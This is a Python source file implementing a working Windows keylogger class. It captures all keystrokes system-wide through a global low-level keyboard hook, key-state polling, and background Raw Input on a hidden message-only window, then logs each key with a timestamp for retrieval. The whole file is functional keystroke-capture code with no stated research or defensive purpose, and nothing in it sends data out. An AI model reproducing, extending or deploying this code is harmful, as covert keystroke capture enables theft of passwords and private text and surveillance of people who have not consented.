import ctypes
from ctypes import wintypes
import threading
import time

# Win32 Constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN     = 0x0100
WM_SYSKEYDOWN  = 0x0104
WM_INPUT       = 0x00FF
RID_INPUT      = 0x10000003
RIDEV_INPUTSINK = 0x00000100

# HWND_MESSAGE must be a proper HWND, not a plain int
HWND_MESSAGE = ctypes.cast(ctypes.c_void_p(-3), wintypes.HWND)

# ── Custom handle aliases (not exported by wintypes in Python 3.13) ──────────
HCURSOR = wintypes.HANDLE
HICON   = wintypes.HANDLE
HBRUSH  = wintypes.HANDLE

# ── Function pointer types ────────────────────────────────────────────────────
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int64, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
WNDPROC  = ctypes.WINFUNCTYPE(ctypes.c_int64, wintypes.HWND, wintypes.UINT,  wintypes.WPARAM, wintypes.LPARAM)

# ── Win32 Structures ──────────────────────────────────────────────────────────
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode",      wintypes.DWORD),
        ("scanCode",    wintypes.DWORD),
        ("flags",       wintypes.DWORD),
        ("time",        wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]

class RAWINPUTHEADER(ctypes.Structure):
    _fields_ = [
        ("dwType", wintypes.DWORD),
        ("dwSize", wintypes.DWORD),
        ("hDevice", wintypes.HANDLE),
        ("wParam",  wintypes.WPARAM),
    ]

class RAWKEYBOARD(ctypes.Structure):
    _fields_ = [
        ("MakeCode",         wintypes.WORD),
        ("Flags",            wintypes.WORD),
        ("Reserved",         wintypes.WORD),
        ("VKey",             wintypes.WORD),
        ("Message",          wintypes.UINT),
        ("ExtraInformation", wintypes.ULONG),
    ]

class RAWINPUT_UNION(ctypes.Union):
    _fields_ = [("keyboard", RAWKEYBOARD)]

class RAWINPUT(ctypes.Structure):
    _fields_ = [
        ("header", RAWINPUTHEADER),
        ("data",   RAWINPUT_UNION),
    ]

class RAWINPUTDEVICE(ctypes.Structure):
    _fields_ = [
        ("usUsagePage", wintypes.USHORT),
        ("usUsage",     wintypes.USHORT),
        ("dwFlags",     wintypes.DWORD),
        ("hwndTarget",  wintypes.HWND),
    ]

class WNDCLASSEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize",        wintypes.UINT),
        ("style",         wintypes.UINT),
        ("lpfnWndProc",   WNDPROC),
        ("cbClsExtra",    ctypes.c_int),
        ("cbWndExtra",    ctypes.c_int),
        ("hInstance",     wintypes.HINSTANCE),
        ("hIcon",         HICON),
        ("hCursor",       HCURSOR),
        ("hbrBackground", HBRUSH),
        ("lpszMenuName",  wintypes.LPCWSTR),
        ("lpszClassName", wintypes.LPCWSTR),
        ("hIconSm",       HICON),
    ]


def _setup_argtypes(user32, kernel32):
    """Declare argtypes/restype for every Win32 function we call.
    Without these, ctypes passes wrong-sized integers on 64-bit Python 3.13
    and calls silently fail (LastError 126 = 'The specified module could not
    be found' or 6 = 'The handle is invalid').
    """
    # SetWindowsHookExW  – hmod MUST be NULL for global LL hooks (MSDN)
    user32.SetWindowsHookExW.argtypes = [ctypes.c_int, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD]
    user32.SetWindowsHookExW.restype  = wintypes.HANDLE

    user32.UnhookWindowsHookEx.argtypes = [wintypes.HANDLE]
    user32.UnhookWindowsHookEx.restype  = wintypes.BOOL

    user32.CallNextHookEx.argtypes = [wintypes.HANDLE, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
    user32.CallNextHookEx.restype  = ctypes.c_int64

    user32.PeekMessageW.argtypes = [ctypes.POINTER(wintypes.MSG), wintypes.HWND,
                                    wintypes.UINT, wintypes.UINT, wintypes.UINT]
    user32.PeekMessageW.restype  = wintypes.BOOL

    user32.TranslateMessage.argtypes = [ctypes.POINTER(wintypes.MSG)]
    user32.TranslateMessage.restype  = wintypes.BOOL

    user32.DispatchMessageW.argtypes = [ctypes.POINTER(wintypes.MSG)]
    user32.DispatchMessageW.restype  = ctypes.c_int64

    user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_byte * 256)]
    user32.GetKeyboardState.restype  = wintypes.BOOL

    user32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
    user32.MapVirtualKeyW.restype  = wintypes.UINT

    user32.ToUnicode.argtypes = [wintypes.UINT, wintypes.UINT,
                                  ctypes.POINTER(ctypes.c_byte * 256),
                                  ctypes.c_wchar_p, ctypes.c_int, wintypes.UINT]
    user32.ToUnicode.restype  = ctypes.c_int

    user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
    user32.GetAsyncKeyState.restype  = wintypes.SHORT

    # RegisterClassExW / CreateWindowExW / DestroyWindow
    user32.RegisterClassExW.argtypes = [ctypes.POINTER(WNDCLASSEXW)]
    user32.RegisterClassExW.restype  = wintypes.ATOM

    user32.CreateWindowExW.argtypes = [
        wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD,
        ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
        wintypes.HWND, wintypes.HMENU, wintypes.HINSTANCE, wintypes.LPVOID,
    ]
    user32.CreateWindowExW.restype = wintypes.HWND

    user32.DestroyWindow.argtypes = [wintypes.HWND]
    user32.DestroyWindow.restype  = wintypes.BOOL

    user32.DefWindowProcW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
    user32.DefWindowProcW.restype  = ctypes.c_int64

    # RegisterRawInputDevices / GetRawInputData
    user32.RegisterRawInputDevices.argtypes = [ctypes.POINTER(RAWINPUTDEVICE), wintypes.UINT, wintypes.UINT]
    user32.RegisterRawInputDevices.restype  = wintypes.BOOL

    user32.GetRawInputData.argtypes = [wintypes.HANDLE, wintypes.UINT, ctypes.c_void_p,
                                        ctypes.POINTER(wintypes.UINT), wintypes.UINT]
    user32.GetRawInputData.restype  = wintypes.UINT

    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    kernel32.GetModuleHandleW.restype  = wintypes.HMODULE

    kernel32.GetLastError.argtypes = []
    kernel32.GetLastError.restype  = wintypes.DWORD


# ── Unique window class name counter (avoids re-registration errors) ──────────
_class_counter = 0
_class_lock    = threading.Lock()


class Win32Keylogger:
    def __init__(self):
        self.logs      = []
        self.is_running = False
        self.method    = None
        self.thread    = None

        self.user32   = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32

        # Declare correct argtypes immediately so every call is type-safe
        _setup_argtypes(self.user32, self.kernel32)

        # Keep callbacks alive (prevent GC crash)
        self._hook_proc = HOOKPROC(self._hook_callback)
        self._wnd_proc  = WNDPROC(self._raw_input_callback)
        self.h_hook     = None
        self.hwnd       = None
        self._class_name = None

    # ── Public API ────────────────────────────────────────────────────────────
    def start(self, method):
        if self.is_running:
            self.stop()

        self.is_running = True
        self.method     = method

        if method == "hook":
            self.thread = threading.Thread(target=self._run_hook, daemon=True)
        elif method == "polling":
            self.thread = threading.Thread(target=self._run_polling, daemon=True)
        elif method == "raw_input":
            self.thread = threading.Thread(target=self._run_raw_input, daemon=True)
        else:
            self.is_running = False
            raise ValueError(f"Unknown keylogging method: {method}")

        self.thread.start()

    def stop(self):
        self.is_running = False

        if self.h_hook:
            self.user32.UnhookWindowsHookEx(self.h_hook)
            self.h_hook = None

        if self.hwnd:
            self.user32.DestroyWindow(self.hwnd)
            self.hwnd = None

        if self.thread:
            self.thread.join(timeout=2.0)
            self.thread = None

        self.method = None

    def get_logs(self):
        ret = list(self.logs)
        self.logs.clear()
        return ret

    # ── Key translation ───────────────────────────────────────────────────────
    def _translate_vk(self, vk):
        special = {
            0x08: "[BACKSPACE]",
            0x09: "[TAB]",
            0x0D: "[ENTER]",
            0x1B: "[ESC]",
            0x20: " ",
            0x25: "[LEFT]",
            0x26: "[UP]",
            0x27: "[RIGHT]",
            0x28: "[DOWN]",
            0x2E: "[DEL]",
            0x10: "[SHIFT]",
            0x11: "[CTRL]",
            0x12: "[ALT]",
            0x14: "[CAPS_LOCK]",
            0x5B: "[WIN]",
            0x5C: "[WIN]",
        }
        if vk in special:
            return special[vk]

        try:
            state = (ctypes.c_byte * 256)()
            self.user32.GetKeyboardState(ctypes.byref(state))
            buf  = ctypes.create_unicode_buffer(5)
            scan = self.user32.MapVirtualKeyW(vk, 0)
            res  = self.user32.ToUnicode(vk, scan, ctypes.byref(state), buf, len(buf), 0)
            if res > 0 and buf.value.strip():
                return buf.value
        except Exception:
            pass

        if 32 <= vk <= 126:
            return chr(vk)
        return ""

    # ── Method 1: Low-Level Keyboard Hook ────────────────────────────────────
    def _run_hook(self):
        # Global LL hooks require hmod=NULL (not GetModuleHandle) on modern Windows
        self.h_hook = self.user32.SetWindowsHookExW(WH_KEYBOARD_LL, self._hook_proc, None, 0)
        if not self.h_hook:
            err = self.kernel32.GetLastError()
            print(f"[Hook] SetWindowsHookExW failed, LastError={err}")
            self.is_running = False
            return

        msg = wintypes.MSG()
        while self.is_running:
            r = self.user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1)
            if r > 0:
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.005)

        # Cleanup hook on exit
        if self.h_hook:
            self.user32.UnhookWindowsHookEx(self.h_hook)
            self.h_hook = None

    def _hook_callback(self, code, wparam, lparam):
        if code >= 0 and wparam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            try:
                kbd  = ctypes.cast(lparam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                char = self._translate_vk(kbd.vkCode)
                if char:
                    self.logs.append({
                        "timestamp": time.strftime("%H:%M:%S"),
                        "key":       char,
                        "code":      kbd.vkCode,
                    })
            except Exception:
                pass
        return self.user32.CallNextHookEx(self.h_hook, code, wparam, lparam)

    # ── Method 2: Async Key Polling ───────────────────────────────────────────
    def _run_polling(self):
        last_state = [False] * 256
        while self.is_running:
            for vk in range(1, 256):
                state   = self.user32.GetAsyncKeyState(vk)
                is_down = bool(state & 0x8000)
                if is_down and not last_state[vk]:
                    char = self._translate_vk(vk)
                    if char:
                        self.logs.append({
                            "timestamp": time.strftime("%H:%M:%S"),
                            "key":       char,
                            "code":      vk,
                        })
                last_state[vk] = is_down
            time.sleep(0.01)

    # ── Method 3: Raw Input ───────────────────────────────────────────────────
    def _run_raw_input(self):
        global _class_counter
        with _class_lock:
            _class_counter += 1
            class_name = f"RawInputListenerClass_{_class_counter}"
        self._class_name = class_name

        h_inst = self.kernel32.GetModuleHandleW(None)

        wcex = WNDCLASSEXW()
        wcex.cbSize        = ctypes.sizeof(WNDCLASSEXW)
        wcex.lpfnWndProc   = self._wnd_proc
        wcex.hInstance     = h_inst
        wcex.lpszClassName = class_name

        atom = self.user32.RegisterClassExW(ctypes.byref(wcex))
        if not atom:
            err = self.kernel32.GetLastError()
            print(f"[RawInput] RegisterClassExW failed, LastError={err}")
            self.is_running = False
            return

        # HWND_MESSAGE is -3 cast to HWND (not a plain Python int)
        self.hwnd = self.user32.CreateWindowExW(
            0, class_name, "RawInputWindow", 0,
            0, 0, 0, 0,
            HWND_MESSAGE, None, h_inst, None,
        )
        if not self.hwnd:
            err = self.kernel32.GetLastError()
            print(f"[RawInput] CreateWindowExW failed, LastError={err}")
            self.is_running = False
            return

        rid = RAWINPUTDEVICE()
        rid.usUsagePage = 1     # Generic Desktop Controls
        rid.usUsage     = 6     # Keyboard
        rid.dwFlags     = RIDEV_INPUTSINK
        rid.hwndTarget  = self.hwnd

        if not self.user32.RegisterRawInputDevices(ctypes.byref(rid), 1, ctypes.sizeof(RAWINPUTDEVICE)):
            err = self.kernel32.GetLastError()
            print(f"[RawInput] RegisterRawInputDevices failed, LastError={err}")
            self.is_running = False
            return

        msg = wintypes.MSG()
        while self.is_running:
            r = self.user32.PeekMessageW(ctypes.byref(msg), self.hwnd, 0, 0, 1)
            if r > 0:
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.005)

        # Cleanup
        if self.hwnd:
            self.user32.DestroyWindow(self.hwnd)
            self.hwnd = None

    def _raw_input_callback(self, hwnd, msg, wparam, lparam):
        if msg == WM_INPUT:
            try:
                size = wintypes.UINT(0)
                self.user32.GetRawInputData(
                    ctypes.c_void_p(lparam), RID_INPUT, None,
                    ctypes.byref(size), ctypes.sizeof(RAWINPUTHEADER),
                )
                if size.value > 0:
                    buf = ctypes.create_string_buffer(size.value)
                    got = self.user32.GetRawInputData(
                        ctypes.c_void_p(lparam), RID_INPUT, buf,
                        ctypes.byref(size), ctypes.sizeof(RAWINPUTHEADER),
                    )
                    if got == size.value:
                        raw = ctypes.cast(buf, ctypes.POINTER(RAWINPUT)).contents
                        if raw.header.dwType == 1:  # RIM_TYPEKEYBOARD
                            kbd     = raw.data.keyboard
                            is_down = not (kbd.Flags & 1)
                            if is_down:
                                char = self._translate_vk(kbd.VKey)
                                if char:
                                    self.logs.append({
                                        "timestamp": time.strftime("%H:%M:%S"),
                                        "key":       char,
                                        "code":      kbd.VKey,
                                    })
            except Exception:
                pass
        return self.user32.DefWindowProcW(hwnd, msg, wparam, lparam)
